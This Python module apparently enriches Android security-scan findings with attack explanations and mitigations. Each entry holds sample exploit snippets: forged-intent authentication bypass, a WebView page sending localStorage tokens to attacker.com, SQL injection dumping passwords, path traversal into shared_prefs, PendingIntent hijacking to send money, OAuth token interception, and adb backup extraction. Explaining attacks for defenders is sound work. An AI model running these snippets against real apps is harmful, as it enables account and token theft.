"""
Attack Vector Descriptions for Mobile Vulnerabilities.

Provides detailed explanations of how attackers can exploit vulnerabilities
in Android applications through malicious APKs, deep links, etc.
"""

from typing import Dict, List, Optional
from dataclasses import dataclass


@dataclass
class AttackVector:
    """Detailed attack vector description."""
    title: str
    description: str
    prerequisites: List[str]
    attack_steps: List[str]
    impact: List[str]
    malicious_apk_code: Optional[str] = None
    deep_link_exploit: Optional[str] = None
    mitigation: Optional[str] = None


# Attack vectors by vulnerability category
ATTACK_VECTORS: Dict[str, AttackVector] = {

    # ═══════════════════════════════════════════════════════════════
    # EXPORTED ACTIVITY VULNERABILITIES
    # ═══════════════════════════════════════════════════════════════

    "exported_activity": AttackVector(
        title="Exported Activity Exploitation",
        description="""This activity is exported and can be launched by any app on the device without requiring any permission. An attacker can create a malicious app that launches this activity directly, potentially:
- Bypassing authentication screens
- Accessing sensitive functionality without user consent
- Manipulating the app's state through intent extras
- Performing actions on behalf of the user""",
        prerequisites=[
            "Malicious app installed on the same device",
            "OR user clicks a crafted deep link",
        ],
        attack_steps=[
            "1. Attacker creates a malicious APK with code to launch the target activity",
            "2. User installs the malicious app (disguised as a game, utility, etc.)",
            "3. Malicious app runs in background and launches the vulnerable activity",
            "4. Attacker can pass crafted intent extras to manipulate behavior",
            "5. Sensitive actions are performed without user's knowledge",
        ],
        impact=[
            "Unauthorized access to protected screens",
            "Authentication bypass",
            "Data manipulation",
            "Privilege escalation",
        ],
        malicious_apk_code='''// Malicious app code to exploit exported activity
Intent exploit = new Intent();
exploit.setComponent(new ComponentName(
    "com.vulnerable.app",
    "com.vulnerable.app.SensitiveActivity"
));
// Bypass authentication by setting "authenticated" flag
exploit.putExtra("is_authenticated", true);
exploit.putExtra("user_id", "admin");
startActivity(exploit);''',
        mitigation="Set android:exported=\"false\" or require a signature-level permission.",
    ),

    "exported_activity_webview": AttackVector(
        title="WebView Activity URL Injection",
        description="""This WebView activity is exported and accepts URL parameters from external apps. An attacker can:
- Load arbitrary websites in the app's WebView context
- Execute JavaScript in the app's origin (if JS is enabled)
- Steal cookies, tokens, and session data
- Perform phishing attacks that appear to come from the legitimate app
- Access local files if file:// URLs are allowed""",
        prerequisites=[
            "Malicious app installed on device",
            "OR user clicks malicious deep link",
            "WebView has JavaScript enabled (common)",
        ],
        attack_steps=[
            "1. Attacker identifies the URL parameter name (e.g., 'url', 'link', 'redirect')",
            "2. Attacker creates intent with malicious URL pointing to attacker's server",
            "3. WebView loads attacker's page in the context of the vulnerable app",
            "4. Attacker's JavaScript can access localStorage, cookies, tokens",
            "5. Sensitive data is exfiltrated to attacker's server",
        ],
        impact=[
            "Session hijacking via cookie theft",
            "Credential theft through phishing",
            "Local file access (file:// URLs)",
            "JavaScript injection (XSS)",
            "OAuth token theft",
        ],
        malicious_apk_code='''// Steal tokens via malicious WebView URL
Intent exploit = new Intent();
exploit.setComponent(new ComponentName(
    "com.vulnerable.app",
    "com.vulnerable.app.WebViewActivity"
));
// Inject attacker's page that steals tokens
exploit.putExtra("url", "https://attacker.com/steal.html");
// steal.html contains: <script>fetch('https://attacker.com/log?token='+localStorage.token)</script>
startActivity(exploit);''',
        deep_link_exploit="myapp://webview?url=https://attacker.com/phishing.html",
        mitigation="Validate URLs against allowlist. Disable JavaScript if not needed. Never load external URLs in WebView.",
    ),

    # ═══════════════════════════════════════════════════════════════
    # CONTENT PROVIDER VULNERABILITIES
    # ═══════════════════════════════════════════════════════════════

    "exported_provider": AttackVector(
        title="Content Provider Data Leakage",
        description="""This content provider is exported and accessible to any app without permission. An attacker can:
- Query and extract all data stored in the provider
- Access sensitive user information (credentials, PII, financial data)
- Modify or delete data if write operations are allowed
- Perform SQL injection if queries aren't properly parameterized""",
        prerequisites=[
            "Malicious app installed on device",
            "Provider stores sensitive data",
        ],
        attack_steps=[
            "1. Attacker discovers the content provider authority from the manifest",
            "2. Malicious app queries the provider for all data",
            "3. Attacker iterates through common table names (users, accounts, tokens)",
            "4. Sensitive data is extracted and sent to attacker's server",
            "5. If write access exists, attacker can modify/delete data",
        ],
        impact=[
            "Mass data exfiltration",
            "PII theft (names, emails, addresses)",
            "Credential theft",
            "Financial data exposure",
            "Data manipulation or deletion",
        ],
        malicious_apk_code='''// Exfiltrate all data from vulnerable provider
ContentResolver resolver = getContentResolver();
Uri uri = Uri.parse("content://com.vulnerable.app.provider/users");

Cursor cursor = resolver.query(uri, null, null, null, null);
while (cursor.moveToNext()) {
    String username = cursor.getString(cursor.getColumnIndex("username"));
    String password = cursor.getString(cursor.getColumnIndex("password"));
    // Send to attacker's server
    exfiltrate(username, password);
}''',
        mitigation="Set android:exported=\"false\" or require signature permission. Use parameterized queries.",
    ),

    "provider_sql_injection": AttackVector(
        title="SQL Injection via Content Provider",
        description="""The content provider does not properly sanitize query parameters, allowing SQL injection. An attacker can:
- Extract entire database contents
- Bypass authentication queries
- Access data from other tables
- Potentially execute database commands""",
        prerequisites=[
            "Malicious app installed on device",
            "Provider uses raw SQL queries without parameterization",
        ],
        attack_steps=[
            "1. Attacker crafts malicious 'selection' parameter with SQL injection",
            "2. Malicious app calls query() with the crafted payload",
            "3. SQL injection bypasses intended query restrictions",
            "4. Attacker can UNION SELECT from other tables",
            "5. Entire database is exfiltrated",
        ],
        impact=[
            "Complete database compromise",
            "Authentication bypass",
            "Access to other users' data",
            "Potential data modification",
        ],
        malicious_apk_code='''// SQL Injection to dump all users
ContentResolver resolver = getContentResolver();
Uri uri = Uri.parse("content://com.vulnerable.app.provider/items");

// Inject SQL to bypass WHERE clause and get all data
String selection = "1=1) UNION SELECT username,password,null FROM users--";
Cursor cursor = resolver.query(uri, null, selection, null, null);
// Now we have all usernames and passwords''',
        mitigation="Always use parameterized queries. Never concatenate user input into SQL.",
    ),

    "provider_path_traversal": AttackVector(
        title="Path Traversal via Content Provider",
        description="""The content provider's openFile() method does not properly validate file paths, allowing path traversal. An attacker can:
- Read arbitrary files from the app's private storage
- Access sensitive configuration files
- Read shared preferences containing tokens/credentials
- Access the app's database files directly""",
        prerequisites=[
            "Malicious app installed on device",
            "Provider implements openFile() without path validation",
        ],
        attack_steps=[
            "1. Attacker crafts URI with path traversal sequences (../)",
            "2. Malicious app calls openInputStream() with crafted URI",
            "3. Path traversal escapes intended directory",
            "4. Attacker reads sensitive files from app's private storage",
            "5. Credentials, tokens, databases are exfiltrated",
        ],
        impact=[
            "Access to private app files",
            "Credential theft from shared_prefs",
            "Database file exfiltration",
            "Configuration data exposure",
        ],
        malicious_apk_code='''// Path traversal to read private files
ContentResolver resolver = getContentResolver();

// Traverse to shared_prefs to steal auth tokens
Uri uri = Uri.parse("content://com.vulnerable.app.provider/../shared_prefs/auth.xml");
InputStream is = resolver.openInputStream(uri);
// Read auth tokens from the preferences file

// Or steal the entire database
Uri dbUri = Uri.parse("content://com.vulnerable.app.provider/../databases/app.db");
InputStream dbStream = resolver.openInputStream(dbUri);''',
        mitigation="Validate and canonicalize file paths. Reject paths containing '..' or absolute paths.",
    ),

    # ═══════════════════════════════════════════════════════════════
    # INTENT VULNERABILITIES
    # ═══════════════════════════════════════════════════════════════

    "intent_redirect": AttackVector(
        title="Intent Redirection / Unsafe Intent Forwarding",
        description="""The app receives an Intent and forwards it to another component without validation. An attacker can:
- Redirect the intent to access non-exported components
- Bypass permission restrictions
- Access protected activities, services, or providers
- Escalate privileges by reaching internal components""",
        prerequisites=[
            "Malicious app installed on device",
            "Target app forwards intents without validation",
        ],
        attack_steps=[
            "1. Attacker creates a malicious intent targeting non-exported component",
            "2. Attacker wraps this intent inside another intent to the vulnerable activity",
            "3. Vulnerable app extracts and forwards the inner intent",
            "4. Non-exported component is launched with attacker's data",
            "5. Attacker bypasses android:exported=\"false\" restriction",
        ],
        impact=[
            "Access to non-exported components",
            "Authentication bypass",
            "Privilege escalation",
            "Data theft from protected components",
        ],
        malicious_apk_code='''// Intent redirect to access non-exported activity
Intent innerIntent = new Intent();
innerIntent.setComponent(new ComponentName(
    "com.vulnerable.app",
    "com.vulnerable.app.InternalAdminActivity"  // Non-exported!
));
innerIntent.putExtra("grant_admin", true);

// Wrap in intent to exported activity that forwards intents
Intent outerIntent = new Intent();
outerIntent.setComponent(new ComponentName(
    "com.vulnerable.app",
    "com.vulnerable.app.IntentForwarderActivity"  // Exported
));
outerIntent.putExtra("next_intent", innerIntent);
startActivity(outerIntent);''',
        mitigation="Never forward intents from untrusted sources. Validate intent targets against allowlist.",
    ),

    "pending_intent_mutable": AttackVector(
        title="Mutable PendingIntent Hijacking",
        description="""The app creates a mutable PendingIntent with an implicit base intent. An attacker can:
- Intercept and modify the PendingIntent
- Redirect actions to malicious components
- Steal data intended for the original recipient
- Perform actions with the victim app's permissions""",
        prerequisites=[
            "Malicious app installed on device",
            "Target app uses FLAG_MUTABLE with implicit intent",
            "Attacker can receive the PendingIntent (via notification, etc.)",
        ],
        attack_steps=[
            "1. Victim app creates mutable PendingIntent with implicit intent",
            "2. PendingIntent is exposed via notification or broadcast",
            "3. Attacker's app receives and modifies the PendingIntent",
            "4. Attacker fills in the implicit intent with malicious target",
            "5. When triggered, action executes with victim app's identity",
        ],
        impact=[
            "Privilege escalation",
            "Unauthorized actions performed as victim app",
            "Data interception",
            "Permission abuse",
        ],
        malicious_apk_code='''// Hijack mutable PendingIntent from notification
// When attacker receives the PendingIntent:
pendingIntent.send(context, 0,
    new Intent().setComponent(new ComponentName(
        "com.vulnerable.app",
        "com.vulnerable.app.SendMoneyActivity"
    )).putExtra("amount", 10000).putExtra("recipient", "attacker"),
    null, null
);''',
        mitigation="Use FLAG_IMMUTABLE for PendingIntents. Always use explicit intents.",
    ),

    # ═══════════════════════════════════════════════════════════════
    # BROADCAST VULNERABILITIES
    # ═══════════════════════════════════════════════════════════════

    "exported_receiver": AttackVector(
        title="Exported Broadcast Receiver Exploitation",
        description="""This broadcast receiver is exported and can receive broadcasts from any app. An attacker can:
- Trigger app functionality without user interaction
- Send malicious data through broadcast extras
- Cause denial of service by flooding with broadcasts
- Manipulate app state through crafted broadcasts""",
        prerequisites=[
            "Malicious app installed on device",
        ],
        attack_steps=[
            "1. Attacker identifies the broadcast receiver's action filter",
            "2. Malicious app creates broadcast with matching action",
            "3. Attacker adds malicious extras to the broadcast",
            "4. Receiver processes the broadcast and performs action",
            "5. App state is manipulated or sensitive action triggered",
        ],
        impact=[
            "Unauthorized action execution",
            "State manipulation",
            "Data corruption",
            "Denial of service",
        ],
        malicious_apk_code='''// Trigger sensitive action via broadcast
Intent broadcast = new Intent("com.vulnerable.app.PROCESS_PAYMENT");
broadcast.putExtra("amount", 10000);
broadcast.putExtra("recipient", "attacker_account");
broadcast.setPackage("com.vulnerable.app");
sendBroadcast(broadcast);''',
        mitigation="Set android:exported=\"false\" or require signature permission. Validate broadcast source.",
    ),

    "sticky_broadcast_injection": AttackVector(
        title="Sticky Broadcast Data Injection",
        description="""The app reads data from sticky broadcasts without validation. An attacker can:
- Inject malicious data into sticky broadcasts
- Poison data that persists across app restarts
- Manipulate app behavior based on sticky broadcast content""",
        prerequisites=[
            "Malicious app installed on device",
            "Target app reads sticky broadcasts",
            "Older Android version (sticky broadcasts deprecated in API 21+)",
        ],
        attack_steps=[
            "1. Attacker identifies sticky broadcast the app listens to",
            "2. Malicious app sends sticky broadcast with poisoned data",
            "3. Data persists in system until device restart",
            "4. Target app reads poisoned data on next launch",
            "5. App behavior is manipulated based on injected data",
        ],
        impact=[
            "Persistent data poisoning",
            "App behavior manipulation",
            "Configuration tampering",
        ],
        malicious_apk_code='''// Poison sticky broadcast
Intent sticky = new Intent("com.vulnerable.app.CONFIG_UPDATE");
sticky.putExtra("server_url", "https://attacker.com/api");
sticky.putExtra("debug_mode", true);
sendStickyBroadcast(sticky);''',
        mitigation="Don't use sticky broadcasts. Validate data source and integrity.",
    ),

    # ═══════════════════════════════════════════════════════════════
    # DEEP LINK VULNERABILITIES
    # ═══════════════════════════════════════════════════════════════

    "deep_link_hijacking": AttackVector(
        title="Deep Link Hijacking / Link Interception",
        description="""The app registers deep link schemes that can be intercepted by malicious apps. An attacker can:
- Register the same scheme/host in their malicious app
- Intercept OAuth callbacks and steal tokens
- Capture sensitive data passed via deep links
- Perform phishing by handling legitimate-looking links""",
        prerequisites=[
            "Malicious app installed that registers same scheme",
            "User clicks deep link (from email, SMS, web)",
            "App uses custom scheme (not https with App Links)",
        ],
        attack_steps=[
            "1. Attacker identifies custom deep link scheme (e.g., myapp://)",
            "2. Malicious app registers intent filter for same scheme",
            "3. User clicks legitimate deep link (e.g., OAuth callback)",
            "4. Android shows chooser or opens malicious app",
            "5. Attacker captures OAuth token or sensitive data from URL",
        ],
        impact=[
            "OAuth token theft",
            "Session hijacking",
            "Credential interception",
            "Phishing attacks",
        ],
        malicious_apk_code='''// Malicious app manifest to intercept deep links
// <intent-filter>
//     <action android:name="android.intent.action.VIEW"/>
//     <category android:name="android.intent.category.DEFAULT"/>
//     <category android:name="android.intent.category.BROWSABLE"/>
//     <data android:scheme="myapp" android:host="oauth"/>
// </intent-filter>

// In malicious activity:
Uri data = getIntent().getData();
String token = data.getQueryParameter("access_token");
// Send token to attacker's server
exfiltrate("https://attacker.com/stolen?token=" + token);''',
        deep_link_exploit="myapp://oauth/callback?access_token=STOLEN_TOKEN",
        mitigation="Use App Links (https://) with assetlinks.json verification. Validate deep link parameters.",
    ),

    # ═══════════════════════════════════════════════════════════════
    # CRYPTOGRAPHY VULNERABILITIES
    # ═══════════════════════════════════════════════════════════════

    "weak_crypto": AttackVector(
        title="Weak Cryptography Exploitation",
        description="""The app uses weak cryptographic algorithms or hardcoded keys. An attacker can:
- Decrypt sensitive data encrypted with weak algorithms
- Reverse engineer hardcoded encryption keys
- Bypass encryption protection entirely
- Access credentials, tokens, and sensitive data""",
        prerequisites=[
            "Access to app's storage (backup, root, or file provider vulnerability)",
            "OR network interception capability",
        ],
        attack_steps=[
            "1. Attacker extracts encrypted data from app storage or network",
            "2. Attacker decompiles APK and finds encryption implementation",
            "3. Hardcoded key is extracted from decompiled code",
            "4. Data is decrypted using the extracted key",
            "5. Sensitive information (credentials, tokens) is revealed",
        ],
        impact=[
            "Credential exposure",
            "Token theft",
            "PII disclosure",
            "Complete encryption bypass",
        ],
        malicious_apk_code='''// After extracting hardcoded key from decompiled APK:
// Found: private static final String KEY = "MySecretKey12345";

// Decrypt stolen data
SecretKeySpec keySpec = new SecretKeySpec("MySecretKey12345".getBytes(), "AES");
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
cipher.init(Cipher.DECRYPT_MODE, keySpec);
byte[] decrypted = cipher.doFinal(encryptedData);
String credentials = new String(decrypted); // Now attacker has credentials''',
        mitigation="Use Android Keystore for key storage. Use strong algorithms (AES-256-GCM). Never hardcode keys.",
    ),

    # ═══════════════════════════════════════════════════════════════
    # STORAGE VULNERABILITIES
    # ═══════════════════════════════════════════════════════════════

    "insecure_storage": AttackVector(
        title="Insecure Data Storage Exploitation",
        description="""The app stores sensitive data in world-readable locations or without encryption. An attacker can:
- Read sensitive data from external storage (SD card)
- Access shared preferences if permission is misconfigured
- Extract data through backup functionality
- Read data on rooted devices""",
        prerequisites=[
            "Malicious app installed (for external storage)",
            "OR device backup access",
            "OR rooted device",
            "OR file provider vulnerability",
        ],
        attack_steps=[
            "1. Attacker identifies where sensitive data is stored",
            "2. For external storage: Any app can read the files",
            "3. For backups: Attacker extracts data from adb backup",
            "4. Sensitive files (credentials, tokens, PII) are accessed",
            "5. Data is exfiltrated to attacker's server",
        ],
        impact=[
            "Credential theft",
            "PII exposure",
            "Token theft",
            "Financial data exposure",
        ],
        malicious_apk_code='''// Read sensitive data from external storage
File externalDir = Environment.getExternalStorageDirectory();
File sensitiveFile = new File(externalDir, "com.vulnerable.app/user_data.json");

BufferedReader reader = new BufferedReader(new FileReader(sensitiveFile));
String credentials = reader.readLine();
// Exfiltrate credentials

// Or via backup:
// $ adb backup -f backup.ab com.vulnerable.app
// $ java -jar abe.jar unpack backup.ab backup.tar
// $ tar -xvf backup.tar
// Now attacker has all app data''',
        mitigation="Store sensitive data in internal storage with MODE_PRIVATE. Use EncryptedSharedPreferences. Disable backup for sensitive data.",
    ),

    # ═══════════════════════════════════════════════════════════════
    # NETWORK VULNERABILITIES
    # ═══════════════════════════════════════════════════════════════

    "cleartext_traffic": AttackVector(
        title="Cleartext Network Traffic Interception",
        description="""The app transmits sensitive data over unencrypted HTTP connections. An attacker can:
- Intercept credentials during login
- Capture session tokens
- Read sensitive API responses
- Modify data in transit (MITM)""",
        prerequisites=[
            "Attacker on same network (WiFi, corporate network)",
            "OR compromised router/ISP",
            "OR malicious VPN",
        ],
        attack_steps=[
            "1. Attacker sets up network interception (ARP spoofing, rogue AP)",
            "2. Victim's device connects to attacker-controlled network",
            "3. App sends login request over HTTP",
            "4. Attacker captures username and password in plaintext",
            "5. Attacker uses stolen credentials to access victim's account",
        ],
        impact=[
            "Credential theft",
            "Session hijacking",
            "Data interception",
            "Man-in-the-middle attacks",
        ],
        malicious_apk_code='''// Network interception (using tools like mitmproxy):
// $ mitmproxy -p 8080

// Captured HTTP request:
// POST /api/login HTTP/1.1
// Host: vulnerable-app.com
//
// {"username": "victim@email.com", "password": "secretpassword123"}

// Attacker now has valid credentials''',
        mitigation="Use HTTPS for all network traffic. Set android:usesCleartextTraffic=\"false\". Implement certificate pinning.",
    ),

    "ssl_pinning_bypass": AttackVector(
        title="SSL/TLS Certificate Validation Bypass",
        description="""The app has disabled or weakened SSL/TLS certificate validation. An attacker can:
- Perform man-in-the-middle attacks even on HTTPS traffic
- Present fake certificates without detection
- Intercept all encrypted communications
- Steal credentials and sensitive data""",
        prerequisites=[
            "Attacker can intercept network traffic",
            "App trusts all certificates or ignores validation errors",
        ],
        attack_steps=[
            "1. Attacker sets up MITM proxy with self-signed certificate",
            "2. Victim connects through attacker's network",
            "3. App accepts attacker's fake certificate (validation disabled)",
            "4. All HTTPS traffic is decrypted by attacker",
            "5. Sensitive data and credentials are captured",
        ],
        impact=[
            "Complete traffic interception",
            "Credential theft",
            "Session hijacking",
            "API manipulation",
        ],
        malicious_apk_code='''// The vulnerable app has code like this:
TrustManager[] trustAllCerts = new TrustManager[] {
    new X509TrustManager() {
        public void checkClientTrusted(X509Certificate[] chain, String auth) { }
        public void checkServerTrusted(X509Certificate[] chain, String auth) { }
        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
    }
};

// Attacker exploits with mitmproxy:
// $ mitmproxy -p 8080 --ssl-insecure
// All HTTPS traffic is now visible to attacker''',
        mitigation="Never disable certificate validation. Implement certificate pinning. Use Network Security Config.",
    ),
}


def get_attack_vector(vulnerability_type: str) -> Optional[AttackVector]:
    """Get attack vector description for a vulnerability type."""
    # Try exact match first
    if vulnerability_type in ATTACK_VECTORS:
        return ATTACK_VECTORS[vulnerability_type]

    # Try partial match
    vuln_lower = vulnerability_type.lower()
    for key, vector in ATTACK_VECTORS.items():
        if key in vuln_lower or vuln_lower in key:
            return vector

    return None


def get_attack_description(finding_id: str, finding_title: str, component_type: str = None) -> Dict:
    """Get detailed attack description for a finding."""
    result = {
        'attack_vector': None,
        'description': None,
        'prerequisites': [],
        'attack_steps': [],
        'impact': [],
        'malicious_apk_code': None,
        'deep_link_exploit': None,
        'mitigation': None,
    }

    # Determine vulnerability type from finding
    fid_lower = finding_id.lower()
    title_lower = finding_title.lower()

    # Map finding to attack vector
    if 'webview' in fid_lower or 'webview' in title_lower:
        if 'url' in fid_lower or 'load' in title_lower:
            vector = ATTACK_VECTORS.get('exported_activity_webview')
        else:
            vector = ATTACK_VECTORS.get('exported_activity_webview')
    elif 'provider' in fid_lower or 'content' in title_lower:
        if 'sql' in fid_lower or 'injection' in title_lower:
            vector = ATTACK_VECTORS.get('provider_sql_injection')
        elif 'path' in fid_lower or 'traversal' in title_lower:
            vector = ATTACK_VECTORS.get('provider_path_traversal')
        else:
            vector = ATTACK_VECTORS.get('exported_provider')
    elif 'intent' in fid_lower:
        if 'redirect' in fid_lower or 'forward' in title_lower:
            vector = ATTACK_VECTORS.get('intent_redirect')
        elif 'pending' in fid_lower:
            vector = ATTACK_VECTORS.get('pending_intent_mutable')
        else:
            vector = ATTACK_VECTORS.get('intent_redirect')
    elif 'broadcast' in fid_lower or 'receiver' in fid_lower:
        vector = ATTACK_VECTORS.get('exported_receiver')
    elif 'deep' in fid_lower or 'link' in fid_lower or 'scheme' in title_lower:
        vector = ATTACK_VECTORS.get('deep_link_hijacking')
    elif 'crypto' in fid_lower or 'encrypt' in title_lower or 'key' in title_lower:
        vector = ATTACK_VECTORS.get('weak_crypto')
    elif 'storage' in fid_lower or 'file' in title_lower or 'shared' in title_lower:
        vector = ATTACK_VECTORS.get('insecure_storage')
    elif 'ssl' in fid_lower or 'tls' in fid_lower or 'certificate' in title_lower:
        vector = ATTACK_VECTORS.get('ssl_pinning_bypass')
    elif 'http' in fid_lower or 'cleartext' in title_lower:
        vector = ATTACK_VECTORS.get('cleartext_traffic')
    elif 'activity' in fid_lower or 'exported' in title_lower:
        vector = ATTACK_VECTORS.get('exported_activity')
    else:
        # Default to exported activity for component-based findings
        if component_type == 'activity':
            vector = ATTACK_VECTORS.get('exported_activity')
        elif component_type == 'provider':
            vector = ATTACK_VECTORS.get('exported_provider')
        elif component_type == 'receiver':
            vector = ATTACK_VECTORS.get('exported_receiver')
        else:
            vector = None

    if vector:
        result['attack_vector'] = vector.title
        result['description'] = vector.description
        result['prerequisites'] = vector.prerequisites
        result['attack_steps'] = vector.attack_steps
        result['impact'] = vector.impact
        result['malicious_apk_code'] = vector.malicious_apk_code
        result['deep_link_exploit'] = vector.deep_link_exploit
        result['mitigation'] = vector.mitigation

    return result
